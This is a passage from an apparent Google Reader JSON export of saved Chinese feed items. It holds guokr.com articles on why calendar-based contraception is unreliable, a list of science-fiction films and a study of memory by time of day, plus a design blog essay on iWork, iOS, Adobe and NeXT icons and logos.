rape）。</td></tr>\n</tbody>\n</table>\n<table>\n<colgroup><col><col></colgroup>\n<tbody valign=\"top\">\n<tr><td><a href=\"http://www.guokr.com/#id3\">[3]</a></td><td>凯瑟琳`麦金农（Catherine McKinnon），美国著名女性主义者、密歇根大学法学教授。麦金农认为，除非女性明确表示同意，所有异性恋中的性关系都应被视为强奸。</td></tr>\n</tbody>\n</table>\n<div>\n<div><br></div>\n</div>\n<div>\n<div><br></div>\n</div>\n<table>\n<col>\n<col>\n<tbody valign=\"top\">\n<tr><th>编译自:</th><td>THE LEGITIMATE CHILDREN OF RAPE</td>\n</tr>\n<tr><th>刊发信息:</th><td>《纽约客》，2012年8月29日</td>\n</tr>\n<tr><th>文章图片:</th><td>Gegen Missbrauch；newyorker.com</td>\n</tr>\n<tr><th>本文编辑:</th><td>熊出没</td>\n</tr>\n</tbody>\n</table>\n</div>\n</div>"
    },
    "author" : "勤劳的小笼包",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1349806443870",
    "timestampUsec" : "1349806443870169",
    "id" : "tag:google.com,2005:reader/item/bbab9eb6147dca20",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "安全期真的安全吗？",
    "published" : 1349806443,
    "updated" : 1349806443,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/348677/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<div>\n<h1>安全期是怎么来的？</h1>\n<p>新生命的诞生开始于精子与卵子的结合，而要想达到避孕的效果，就要想方设法阻挠它们的相会。安全期避孕采取的策略是计算卵子的出场时间和可能的受精时间，并让精子避开这些时间再出来活动。</p>\n<p>排卵和受精的过程存在一些规律。一般健康女性会在每个月规律地排卵，一个月经周期为28天的女性，排卵日大致在月经来潮前的14天左右 ，卵子在排出可存活1~2天，而精子在进入女性阴道后大约可以存活3天。根据这些规律，我们可以通过女性的生理周期大致确定出容易怀孕的“危险期”，其余的时间就是所谓的“安全期”了。在“理想状态”下，在安全期中进行性行为也不会使精子与卵子相遇，以此达到避孕的效果。</p>\n<div><img src=\"http://img1.guokr.com/gkimage/nk/8k/hy/nk8khy.png\" alt=\"算准安全期比你想象的复杂\"><p>算准安全期比你想象的复杂</p></div>\n</div>\n<div>\n<h1>算准安全期，基本拼RP</h1>\n<p>安全期的原理听上去似乎挺靠谱，但实际上所谓的理想状态并不存在，所以计算起来却会面临很多困难。</p>\n<p>我们经常会听到的安全期计算法是类似“前七后八”或者“前三后四”这样简单的估算，但它只是基于最近的一个月经周期进行计算的。这样的算法要想准确，就要求女性的生理周期总要像时钟一样准点才行。而事实上，并不是所有女性都会规律地排卵，即使是规律排卵的女性，她们的生理周期也会受到环境、情绪、健康状况的影响而波动，实在难保完全准时。因此，这样的计算就会带来很大的误差。</p>\n<p>为了减小这样的误差，也有一些相对更准确的安全期计算方法，例如奥吉诺公式。这种方法要记录最近6~12个月的月经周期，选出最长和最短的周期的数值作为重要参数来计算安全期。月经周期的定义是从月经来潮的第一天到下一次月经来潮的前一天。</p>\n<p>这样的方法虽然比起简单的估算要靠谱一点，因为看起来它用多段周期中的最长和最短值拉平了周期的波动。但使用起来非常麻烦，而且即便是这样也无法逃开那些不确定性的影响，算准周期几乎是小概率事件。靠周期避孕，基本是拼运气，攒人品。</p>\n<p>此外，其他一些因素也可能影响安全期的计算。安全期一般是根据女性自己观察到的月经周期来计算的，但实际上阴道出血并不一定是真正的月经，也可能排卵期出血等其他情况。如果把非月经的出血错当月经来计算，也会导致安全期计算不准。</p>\n</div>\n<div>\n<h1>安全期避孕，效果不给力</h1>\n<p>安全期避孕不仅实施起来会遇到很多麻烦，最终的效果也并不理想。根据世界卫生组织的数据，在理想状态 下，安全期避孕的年失败率约为5%，可靠性不及避孕套及口服短效避孕药。而实际上控制失败率在5%这样的理想状态也是很难达到的，如果使用了比较简略的计算方法，或是自身生理周期不规律，失败率就会大大增加，临床追踪年失败率可达到25%以上。25%的失败率意味着100位成年妇女采用此方法避孕，1年时间内，会有25名妇女怀孕。名字里带着“安全”的字眼迷惑了很多人，其实风险非常大。这样看来，与现有的可靠的避孕方法相比，低有效率几乎成为这类自然方法最大的“副作用”，你能接受吗？</p>\n<p>要想实现真正的安全避孕，就要走出传统的一些误区，通过可靠性对比来正确选择。短效口服避孕药和宫内节育系统（比较适合已生育女性）都是可靠性比较高的方式。（参见文章：吃激素避孕，你恐慌吗？<a href=\"http://www.guokr.com/article/340863/\">http://www.guokr.com/article/340863/</a>）理性思考，既然已经有了药物，节育器之类可靠安全的避孕法，又何必使用安全期避孕，承担不必要的风险呢？如果实在困惑，不知该使用哪种避孕方式，可以到 <a href=\"http://test.chinawcd.com/index.php?r=test\">test.chinawcd.com</a> 去测一下！（提示：线上测试不能代替医生建议）</p>\n<p><strong>结论</strong></p>\n<p>计算安全期看似没有副作用，但它受到生理周期波动等诸多不确定因素的影响，用来避孕效果实在不靠谱，一点也称不上“安全”。要想放心享受避免中招，还是选择药物、避孕套等可靠的避孕方法吧。</p>\n<div>\n<div><br></div>\n</div>\n<p><strong>来关注果壳网微信吧，随时随地了解科学信息，粉碎谣言：</strong></p>\n<img alt=\"http://img1.guokr.com/gkimage/mf/ns/24/mfns24.png\" src=\"http://img1.guokr.com/gkimage/mf/ns/24/mfns24.png\">\n</div>\n</div>"
    },
    "author" : "窗敲雨",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1349806336399",
    "timestampUsec" : "1349806336399535",
    "id" : "tag:google.com,2005:reader/item/529b693c76114b69",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "值得用整个长假去慢慢品味的8部内涵科幻片",
    "published" : 1349806336,
    "updated" : 1349806336,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/351083/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>长假怎么过？如果你没有从神奇的网站上抢到火车票，那么你可能注定要过一个宅的长假。不过没关系，微科幻为你提供了一个还不错的选择——每一天只看一部有内涵的科幻片。当你逃离了信息爆炸的生活，想过一个清静但不那么无脑的长假，下面的每一部科幻片都值得你用一整天去回味。</p>\n<div>\n<div><br></div>\n</div>\n<div>\n<h1>《黑客帝国》 （Matrix）</h1>\n<img alt=\"http://img1.guokr.com/gkimage/8b/86/dr/8b86dr.png\" src=\"http://img1.guokr.com/gkimage/8b/86/dr/8b86dr.png\">\n<p>这部又叫做《二十二世纪杀人网络》的电影诞生在20世纪末，一个互联网刚刚兴起的时代。这只是一个古老的“缸中之脑”哲学假想的技术演绎，却在这个时代里带给世人无与伦比的观念冲击。《黑客帝国》提出了这样一个最本质的怀疑：世界是真实的吗？</p>\n<p>这部电影以及它的系列包罗万象，堪称一套意义和视觉的奇观。现实与虚拟，人类与机器，物质与意识。答案一次次浮现，又一次次被推翻。观看这部电影就像探索一座迷宫，绝对够你回味一整天。</p>\n<div>\n<div><br></div>\n</div>\n</div>\n<div>\n<h1>《蝙蝠侠：黑暗骑士》 （The Dark Knight）</h1>\n<img alt=\"http://img1.guokr.com/gkimage/mj/n6/wl/mjn6wl.png\" src=\"http://img1.guokr.com/gkimage/mj/n6/wl/mjn6wl.png\">\n<p>“为什么那么认真？”这是小丑人所周知的名言。蝙蝠侠在一个“认真你就输了”的世界里维护着他理想中的秩序，以及人们心中象征着光明的希望。蝙蝠侠和小丑的对决，双面人的蜕变，把善恶的抉择和矛盾表现得淋漓尽致。</p>\n<p>蝙蝠侠和小丑同是人群中的异类，同时又是互不相容的，他们仿佛硬币的两面，这是片中大部分情节推动力的来源。诺兰让超级英雄电影达到了前所未有的高度，《蝙蝠侠：黑暗骑士》的叙事和主题都堪称完美，是商业和艺术的完美结合。古典悲剧式的英雄，孤独而带着一种理想主义疯狂的反派，对秩序与反秩序问题的当代解读……这部电影无愧于影史上最经典的科幻电影之一。不管你看过多少遍，总值得再看一遍。</p>\n<div>\n<div><br></div>\n</div>\n</div>\n<div>\n<h1>《V字仇杀队》 （V For Vendetta）</h1>\n<img alt=\"http://img1.guokr.com/gkimage/4j/i3/3f/4ji33f.png\" src=\"http://img1.guokr.com/gkimage/4j/i3/3f/4ji33f.png\">\n<p>人们为什么歌颂暴力？当人们交出了自由，遗忘在和平与秩序里，V意图用极端的方式唤醒沉睡中的人。</p>\n<p>《V字仇杀队》是一部华丽的暴力美学的作品。这类架空历史的作品向来用模糊的故事背景提醒着观众，这不是一部普通的电影。V诡异笑容的脸庞，夜幕下挥动的黑袍。黑暗中漫天绽放的礼花，柴可夫斯基的《1812序曲》，红与黑、善与恶、美与丑、重生与幻灭所形成的鲜明对照。导演的电影美学在这部影片显得尤为突出，这种美学下面具后真实的V更微妙更复杂，也成功地塑造了一个争议性的角色。</p>\n<p>充满争议的V，注定带给世人无尽的思考。</p>\n<div>\n<div><br></div>\n</div>\n</div>\n<div>\n<h1>《第九区》（District 9）</h1>\n<img alt=\"http://img1.guokr.com/gkimage/28/m4/1h/28m41h.png\" src=\"http://img1.guokr.com/gkimage/28/m4/1h/28m41h.png\">\n<p>不是纽约，不是华盛顿，也不是芝加哥，而是在南非的约翰内斯堡。人类给来自外星的难民建立临时居住地，随着时间的推移，外星生物的与当地居民的矛盾冲突愈演愈烈，政府只能对外星生物进行搬迁。</p>\n<p>相对动辄上亿美元投资的好莱坞科幻大制作，《第九区》的投资只能算是小成本。伪纪录片式的拍摄手法让影片更具现实主义的色彩。</p>\n<p>这是一个人类社会的科幻比喻。</p>\n<p>所谓的“同类”与“异类”，有多少是天然的距离，有多少是人为的划分？究竟是什么在界定着我们的身份？这一切无数次发生在人类社会中，但是当它们在两个智慧文明的舞台上上演，我们跳出原有的框架，问题似乎又更清晰的浮现出来，刺痛着我们的心。</p>\n<div>\n<div><br></div>\n</div>\n</div>\n<div>\n<h1>《银翼杀手》（Blade Runner）</h1>\n<img alt=\"http://img1.guokr.com/gkimage/th/l3/2f/thl32f.png\" src=\"http://img1.guokr.com/gkimage/th/l3/2f/thl32f.png\">\n<p>生于1982年的《银翼杀手》曾经被男主演哈里森•福特视为最不愿承认的作品， 但这是一部储酒余香的电影，或许也是导演雷德利•斯科特迄今为止最好的科幻电影。片中杂乱昏沉的时代特征，光影迷离尤似废墟的建筑，后信息时代的赛博朋克场景，默然的人类，营造出忧伤、残酷、优雅的思考氛围。</p>\n<p>机器人是不是人？人的属性是人性还是人形？这是一个无解的谜题，哪怕用生命来解答。所有美好事物都随着冰冷的雨水连同泪水一起消失了。</p>\n<div>\n<div><br></div>\n</div>\n</div>\n<div>\n<h1>《迷雾》 （The Mist）</h1>\n<img alt=\"http://img1.guokr.com/gkimage/mo/w6/18/mow618.png\" src=\"http://img1.guokr.com/gkimage/mo/w6/18/mow618.png\">\n<p>暴风雨突袭宁静小镇，灾后大伙都去镇上的超市添补用品，防空警报突然长啸，迷雾来袭，恐怖的魔鬼就隐藏在厚重的迷雾之下。本片改编自史蒂芬•金的同名中篇小说。</p>\n<p>宗教迷信的疯狂与坚固，自救者的理智与脆弱，这两个强烈的对立交织起来，笼罩着这个封闭空间中的人性角斗场。结尾震撼人心。</p>\n<div>\n<div><br></div>\n</div>\n</div>\n<div>\n<h1>《超时空接触》（Contact）</h1>\n<img alt=\"http://img1.guokr.com/gkimage/nc/ig/at/ncigat.png\" src=\"http://img1.guokr.com/gkimage/nc/ig/at/ncigat.png\">\n<p>电影根据美国天文学家、科幻作家卡尔•萨根的小说改编，探讨了“科学”与“宗教”这两个南辕北辙又可能相互依存的事物。</p>\n<p>从事地外生命探索工作的天文学家艾莉经历了一次与外星人的接触，而这次接触和神迹无异，也无法证实。由此纷至沓来的，政治、社会、宗教、国家各个角度的矛盾与讨论。科学信念与宗教信仰之间发生了剧烈的化学反应。</p>\n<p>艾莉在听证会上说下了这样的的辩词：“我无法证实，甚至无法解释，但我知道这是真的，关于宇宙、幻想。作为人类，我们是多么渺小而微不足道，但同时我们的存在又是多么的可贵。我们必须有所敬畏地活着，敬畏着一个比我们更伟大的存在。因为我们并不孤单。”</p>\n<div>\n<div><br></div>\n</div>\n</div>\n<div>\n<h1>《2001太空漫游》（2001: A Space Odyssey）</h1>\n<img alt=\"http://img1.guokr.com/gkimage/r7/ex/q2/r7exq2.png\" src=\"http://img1.guokr.com/gkimage/r7/ex/q2/r7exq2.png\">\n<p>刘慈欣在《小崔说事》节目上说，这部电影的开头几分钟黑屏是给他震撼最深的地方。这是一种对宇宙的审美，是人类心中最核心的精神。</p>\n<p>这是一部关于人类的电影，关切着人类的过去、现在和未来。我们从哪里来？我们是谁？我们往哪里去？一切的旁观者是一块黑色的石碑，然而黑色石碑沉默不语，冷冷地反射着人类的好奇、探索、成长。这是一部经常被各类作品致敬的电影，一部从未被超越的经典。看着电影，你将会惬意地在飞船上进入梦乡，感受着时间的流动，空间的深邃以及那深空中回荡着的《蓝色多瑙河》。</p>\n</div>\n</div>"
    },
    "author" : "Majel",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.guokr.com/rss/",
      "title" : "果壳网 guokr.com",
      "htmlUrl" : "http://www.guokr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1348169781037",
    "timestampUsec" : "1348169781037635",
    "id" : "tag:google.com,2005:reader/item/867627b9fb320c86",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "设计" ],
    "title" : "审美、效用与情感——关于icon和Logo设计的一些想法",
    "published" : 1347525830,
    "updated" : 1347525830,
    "alternate" : [ {
      "href" : "http://blog.xiqiao.info/2012/09/13/1254",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<h2>你们觉得iWork 3个icon里哪个最好。 Pages, Keynote 还是 Numbers?</h2>\n<p><a rel=\"attachment wp-att-1257\" href=\"http://blog.xiqiao.info/2012/09/13/1254/iwork-3\"><img title=\"iWork\" src=\"http://blog.xiqiao.info/wp-content/uploads/2012/09/iWork2.jpg\" alt=\"\" width=\"488\" height=\"218\"></a></p>\n<p>虽然Pages和Keynote拥有非常精致的造型和拟真效果，但是就icon设计而言，Numbers要超过它们。 Numbers脱胎于现实中的物体但又不是完全模拟它们，形象更简洁有力。</p>\n<p>从表意性上，Numbers 对图表工具的概念进行了成功的提取和抽象，相信任何人第一次见到这个icon的时候都能认出它是一种什么工具，但墨水瓶（Pages)的象征性太模糊，演讲台（Keynote）是一个人们不熟悉的且特征不明显的事物。人们在通过icon形象识别出工具用途时要更困难。</p>\n<p>从辨识度上，透视和视角的选用形成了很强的立体感，配色也非常鲜明。这些都提高了你从dock条上把它辨识出来的几率。它的小尺寸表现也好于其它两者。</p>\n<p>Icon的成功更多取决于它是否能有效表意（功能、用途或者非常鲜明的个性特征）并且具有很强区分度，容易认出并建立关联。而不是在于它是否材质更漂亮或更拟真。</p>\n<h2>为什么iOS UI上所有的icon都限制为圆角矩形？</h2>\n<p><a rel=\"attachment wp-att-1261\" href=\"http://blog.xiqiao.info/2012/09/13/1254/iphone\"><img title=\"iPhone\" src=\"http://blog.xiqiao.info/wp-content/uploads/2012/09/iPhone.jpg\" alt=\"\" width=\"400\" height=\"600\"></a></p>\n<p>有一些设备的UI上的icon允许透明通道，也就是允许icon是各种形状的。这显然让设计师有更大的发挥余地，能够创作出更漂亮的作品。</p>\n<p>但是iPhone的桌面是一个访问频率非常高、空间有限、icon放置密度非常高的环境。icon之间的间距没法很大，如果不统一上面几十个icon的形状，会导致一个非常杂乱的界面，icon之间也会彼此干扰。（虽然LaunchPad也是这种罗列icon的方式，但拥有较大的空间和间距，情况会好一点。）所以规整统一的形状可以带来良好的节奏和协调的感官，同时也可以和设备的整体外形相呼应。</p>\n<p><a rel=\"attachment wp-att-1262\" href=\"http://blog.xiqiao.info/2012/09/13/1254/launchpad\"><img title=\"launchpad\" src=\"http://blog.xiqiao.info/wp-content/uploads/2012/09/launchpad.jpg\" alt=\"\" width=\"600\" height=\"471\"></a></p>\n<p><a rel=\"attachment wp-att-1262\" href=\"http://blog.xiqiao.info/2012/09/13/1254/launchpad\"></a><br>\n此外，设定这一“游戏规则”也平均了icon们的风格和水准。目前app stone上已经上架了10W个应用，也就有10W个icon，设计水平参差不齐。但统一的形状和iOS官方icon设计所引导的风格，让最差的设计师也不会做出烂得超过底线，影响整个设备UI的icon来。即使你啥都不会，选一个背景色，在上面放一个字母，也能成为你的icon，而且效果也不太坏。所以在iOS设备上你不会看到那种一堆icon里突然冒出一个特别土带着粗大的锯齿边和蹩脚阴影的刺眼玩意。</p>\n<p>从iOS的开发定位来看，Apple一直都选用的是一个平均化但是最能保证整体效果的方案。让一个工程师，仅仅利用默认控件，也能做出可用可看的App。</p>\n<p>设计和艺术的区别之一正是“设计是带着镣铐跳舞”。</p>\n<p>游戏规则的设定，就是为了保障整个游戏的可玩性和所有玩家的利益，我想对所有icon外形的限制（包括HIG中对许多控件及交互方式的限制）就是整个平台设计策略的一环。</p>\n<h2>为什么Adobe套装里的icon都做成那个样子？</h2>\n<p><a rel=\"attachment wp-att-1272\" href=\"http://blog.xiqiao.info/2012/09/13/1254/adobecs\"><img title=\"adobecs\" src=\"http://blog.xiqiao.info/wp-content/uploads/2012/09/adobecs.jpg\" alt=\"\" width=\"600\" height=\"243\"></a></p>\n<p>CS2在04年发布，CS3在07年发布。这3年间Adobe做了很多重要的战略调整，事件之一是收购了Marcomedia，并且更强调工具之间的兼容性，并提供一些平台化工具。Adobe需要推出更多套装，并在里面包含更多应用。从提供工具变成了提供工具箱。</p>\n<p>CS3刚出来的时候，对icon设计进行了重大的改变，当然获得了大量恶评，理由都是一个丑。就单个icon来看，CS3的PS图标比CS2差几个级别，Adobe不是找不到好设计师，为什么要这么做。</p>\n<p><a href=\"http://ww4.sinaimg.cn/large/a74e55b4jw1dwuyjzsk8zj.jpg\"><img src=\"http://ww4.sinaimg.cn/large/a74e55b4jw1dwuyjzsk8zj.jpg\" border=\"0\" alt=\"\"></a></p>\n<p>看完这张图就明白了。Adobe的设计工具都比较难以根据功能来提取出一个具象概念，只好用羽毛，花朵，树叶这种很“精神层面”的的物体来表示。当套装变得更大，设计师桌面上需要放下更多Adobe应用的icon时会出现什么状况，他的鼠标会在几个icon之间遊移。当然假以时日，反射弧会被建立，也会通过摆放位置来进行记忆，但对于新用户而言，这无疑是一个悲剧。</p>\n<p><a href=\"http://ww4.sinaimg.cn/large/a74ecc4cjw1dwuykpnzakj.jpg\"><img src=\"http://ww4.sinaimg.cn/large/a74ecc4cjw1dwuykpnzakj.jpg\" border=\"0\" alt=\"\"></a></p>\n<p>展示这张图不是为了说明Adobe的新icon们在色相环上的分布，而是为了说明有它们工具数量的庞大。</p>\n<p>CS3系列后的新icon虽然不好看，但无疑极为直观，无需建立对象及其象征物之间的关联，这不是表意而是直接对着你喊出来，“我是PS”。文字带来最快速的反应。</p>\n<p>风格强烈，你可以轻易识别出它们是属于一个Adobe的。</p>\n<p>此外它最大化利用了系统中icon的尺寸限制，一整个大色块。所以你会发现它们无论是在dock条还是windows桌面上，都是抢眼的。</p>\n<p>设计过程中如何做决策，美的标准是什么，我借用一下《data visualization》一书中的观点：novel （创新)， informative (这里可以理解为否实现设计的功能，传达出需要传达的信息）, efficient （能否有效地达成设计诉求）, aesthetic （是否有视觉魅力）。受众、目标和情境是设计开始之前必须回答的问题，一个不能保障可用性（有效达成目标，满足需求，适配于使用情境）的设计，再好看再创新也是失败的。Adobe的选择也正是基于这一点。</p>\n<h2>OS X官方App中最打动你的icon是哪个？</h2>\n<p>Automator. 这是一个通过点击拖拽这些操作在不同应用间创建工作流（批处理）的工具。这用一个拿着管道（连接件)的高科技机器人来表示最非常恰当的。精密、冷酷、充满魅力的质感，直接就是苹果的气质的体现。</p>\n<p>它打动我是因为它是一个被人格化的icon，也是OS X官方icon中唯一一个拟人化的设计。用一个令人爱不释手的高科技机器人来表达一个编程工具。Automator代表了apple script的最高成就，这种东西对于编程语言的意义，相当于GUI对桌面系统。高科技机器人带给我们的，正是利用高水平的技术和工业设计，提供了生产率，降低了使用门槛和成本。这个形象是不是也让你作为一个普通人也有兴趣去尝试编写程序。比Terminal的icon给你的心理压力小多了吧。</p>\n<p><a href=\"http://blog.xiqiao.info/wp-content/uploads/2012/09/TerminalApp-Icon.png\"><img title=\"TerminalApp-Icon\" src=\"http://blog.xiqiao.info/wp-content/uploads/2012/09/TerminalApp-Icon.png\" alt=\"\" width=\"200\" height=\"178\"></a></p>\n<p>这个设计在可用性和美观的标准之上，体现对情感的传递。它建立的不仅仅是效用，而是喜爱。很多时候 ，感性认识比理性认识对于人们做出决定更为关键。</p>\n<p>新版的icon更换了质感，简化了材质上的细节， 加深对比度和整体颜色，强化了轮廓。我感觉是一个从 炫目、模拟真实质感-&gt;更简洁和抽象、和环境能搭配 的变化过程。新版的在小尺寸下表现也更好。</p>\n<p><a href=\"http://ww3.sinaimg.cn/large/a74eed94jw1dwuylff8c4j.jpg\"><img src=\"http://ww3.sinaimg.cn/large/a74eed94jw1dwuylff8c4j.jpg\" border=\"0\" alt=\"\"></a></p>\n<h2>NeXT的logo是不是很丑？</h2>\n<p>很多人都知道它是Jobs请Paul Rand花了10W刀设计的。</p>\n<p><a href=\"http://ww1.sinaimg.cn/large/a74e55b4jw1dwuylubu9bj.jpg\"><img src=\"http://ww1.sinaimg.cn/large/a74e55b4jw1dwuylubu9bj.jpg\" border=\"0\" alt=\"\"></a></p>\n<p>首先我觉得它并不好看。但是好看绝对不是一个LOGO设计是否成功的唯一标准。</p>\n<p>首先试图追溯Paul为什么要这样设计NeXT的logo</p>\n<p><a href=\"http://ww3.sinaimg.cn/large/a74ecc4cjw1dwuym4b93wj.jpg\"><img src=\"http://ww3.sinaimg.cn/large/a74ecc4cjw1dwuym4b93wj.jpg\" border=\"0\" alt=\"\"></a></p>\n<p>这就是NeXT cube， NeXT computer的机箱，它最大的特征就是 方正（据说Jobs花了很大代价追究8个角的锐利，就像用尺规工具在纸上画出来的那样干净准确）、极简（用色纯粹，没有多余的线条和装饰）。这个工设放到30年后来看都毫不逊色。</p>\n<p><a href=\"http://ww2.sinaimg.cn/large/a74eed94jw1dwuymf4uh5j.jpg\"><img src=\"http://ww2.sinaimg.cn/large/a74eed94jw1dwuymf4uh5j.jpg\" border=\"0\" alt=\"\"></a></p>\n<p>这是NeXTSTEP / OPENSTEP 1.0 (released in 1989)。该 GUI 的图标很大，48×48像素，包含更多颜色，从1.0开始支持彩色，已经可以看到现代 GUI 的影子。</p>\n<p>比较一下同年代的其它GUI水准。</p>\n<p>Windows 2.0x (released in 1987)</p>\n<p><a href=\"http://ww1.sinaimg.cn/large/a74ecc4cjw1dwuyn4ajheg.gif\"><img src=\"http://ww1.sinaimg.cn/large/a74ecc4cjw1dwuyn4ajheg.gif\" border=\"0\" alt=\"\"></a></p>\n<p>OS/2 1.20 (released in 1989)</p>\n<p><a href=\"http://ww1.sinaimg.cn/large/a74e55b4jw1dwuymrrfr5g.gif\"><img src=\"http://ww1.sinaimg.cn/large/a74e55b4jw1dwuymrrfr5g.gif\" border=\"0\" alt=\"\"></a></p>\n<p>Desktop Computer操作系统之GUI发展 <a href=\"http://blog.csdn.net/greenhand_/article/details/7787861\"> http://blog.csdn.net/greenhand_/article/details/7787861</a></p>\n<p>N e X T 这4个字母的颜色，搞设计的同学应能容易联想到CMYK，现在找不到原设计图了，没法取到精确色值，但我推测都是满值的。大红 M100%Y100%, 绿色 C100%Y100%， 黄色Y100%， 品红M100%。<br>\n我的一个在苹果工作过的朋友，在那个年代见过NeXT的LOGO，他的印象是颜色非常艳丽饱满，这也正是Paul想传达给消费者的关于这个产品的特征。在当时的印刷平均条件下，Paul的这个用色选择是大胆，同时也是成功的。</p>\n<p>Paul 从NeXT的经典产品中抽离除了最本质的几个特征。立方体，极简，纯黑的底色，还有颜色丰富、富有魅力的GUI。</p>\n<p>抽象的过程就是一个简化的过程，也是一个靠近事物本质的过程。得到本质以后，其他一切都只是从属，都可以根据恰当的条件进行省略。</p>\n<p>Jobs看到方案问Paul, 还有其它可选方案吗？Paul 说：“没有，我已经解决了你的问题。付钱吧。想要可选方案？找别人去吧。”</p>\n<p>我的理解是，设计是为了解决问题达成诉求，所以最合适的方案当然只有一个。Paul自信他提出的这个设计就是这个最合适的方案，因为它已经解决了“品牌传达”这个最核心的问题。</p>\n<p>Paul 是包豪斯设计思想的继承者，同时为商业服务的使用美术大师，他喜欢拼贴风格，拼贴可以突破空间的限制，用色强烈，造型简单，追求准确的传达而不是盲目的创新。Jobs的评价也是这样，认为Paul 是艺术家和商业问题解决者的结合，认为 Paul 的设计很 emotional（感性），同时又很 intellectual（理智）。</p>\n<p>所以关于这个问题我想说的是，美的标准是变化的，建立在时代和文化背景上的，在观看一件历史上的设计或者艺术作品时，只有理解了它的背景、出发点和诉求之后，才能触摸到它的本质，学习到它的成功之处。同时对于一件为商业服务的设计而言，“有效”是最核心的，而不是“好看”或者什么别的。当然达到有效的手段有很多种，比如创新、情感化，视觉表现手法当然也在其中。</p>\n<h2>为什么世界五百强中大部分的Logo都很“难看”？</h2>\n<p>回答完了上一个问题之后，我觉得这个问题也不用回答了。</p>\n<p>我给难看加上了引号是因为审美永远是一个相对标准，随个人偏好、时代定位和文化背景所变化。</p>\n<p>世界500强公司能做大往往也有着悠久的历史。他们的LOGO穿过了几个文明快速发展、观念快速变化的时代，其传播载体和条件也在不断更新。无论它们是否还符合现在的审美，它们在当时的背景下都已经完成了品牌传达的目标，建立了鲜明识别度，并且成为企业文化的一部分。</p>"
    },
    "author" : "西乔",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds.feedburner.com/hc1983",
      "title" : "西乔的九卦",
      "htmlUrl" : "http://blog.xiqiao.info"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1348169050235",
    "timestampUsec" : "1348169050235221",
    "id" : "tag:google.com,2005:reader/item/b19a1dd0c4377351",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "人的记忆力在早晨最好吗？",
    "published" : 1348169050,
    "updated" : 1348169050,
    "alternate" : [ {
      "href" : "http://www.guokr.com/article/342808/",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "<div>\n<p>一天之内人记忆力最好的时间是何时？无论是自愿还是被父母叫起，学生早起背单词背公式总是最常见的，因为他们相信人在清晨的记忆力最好，学习效率最高。那么，事实上真的如此吗？</p>\n<div><img src=\"http://img1.guokr.com/gkimage/51/ee/pm/51eepm.png\" alt=\"早起记忆力一定好吗？/quanjing.com\"><p>早起记忆力一定好吗？/quanjing.com</p></div>\n<div>\n<h1>时间与记忆力</h1>\n<p>一天中不同时间的记忆力差别，属于学习方式研究的一部分。这类研究起始于1894年，在漫长的百年中，心理学家、教育学家、生理学家不断地进行着对人学习模式的丰富和完善，希望对影响学习方式的元素能有全面和深刻的了解，从而更好地应用于教育中。</p>\n<p>直接比较记忆力的实验各种各样。1970年英国约克大学的心理学教授柏德里（Baddeley）发表的一项名为“记忆与一天中时间段”的研究中，他让受试者记住一段短数字再马上复述出来，结果这种对于简单内容的短期记忆，受试者的表现上午优于下午。1972年美国莫瑞州立大学的教授巴莱特（Barrett）发表了一个关于保持记忆的研究，发现在接受信息到再次回想起来的4个小时间隔中，有睡眠的人比没有睡眠的记忆力更好。</p>\n<p>1978年，美国圣约翰大学的里塔•邓（Rita Dunn）和肯尼斯•邓（Kenneth Dunn）教授做了一个一天当中记忆力的比较。他们根据实验的结果将记忆的最佳时段分成了以下四个大类：</p>\n<ol>\n<li>大约30%的人在早晨记忆力最佳。这些人在一清醒时就已经做好了吸收新知识的准备。</li>\n<li>大约30%的人在下午记忆力最佳。他们往往在午饭之后才算是真正活了过来。</li>\n<li>大约30%的人在晚上记忆力最佳。他们就是所谓的“夜猫子”。</li>\n<li>大约10%的人没有任何时间偏向性。他们似乎在任何需要进行学习的时候都能够集中精力学习。</li>\n</ol>\n<p>1993年美国查尔斯顿学院辛西娅•梅（Cynthia May）的研究又表明，老年人在清晨的记忆力达到高峰的较多，而年轻人在下午和晚上达到记忆力的最高峰最常见。</p>\n<p>这些研究综合起来可以让我们得出这样一个结论，大多数年轻人的最佳记忆时间段不一定是早晨，特别是“夜猫子”们的最佳记忆时间段是离开了学校的晚上。也因为如此，不考虑个体差异就强迫年轻人早起背单词记忆公式，到底是否是最好的学习方式也值得商榷。</p>\n<p>里塔•邓和肯尼斯•教授一直致力于宣传在学习中的个体差异，他们创造了一个较早的学习模型：邓和邓学习模式模型(The Dunn and Dunn Learning Style Model)。在这个模型中，他们提出了影响学习的5类刺激因子，一共21种可能性元素。它们分别是：</p>\n<div><img src=\"http://img1.guokr.com/gkimage/4r/wl/ua/4rwlua.png\" 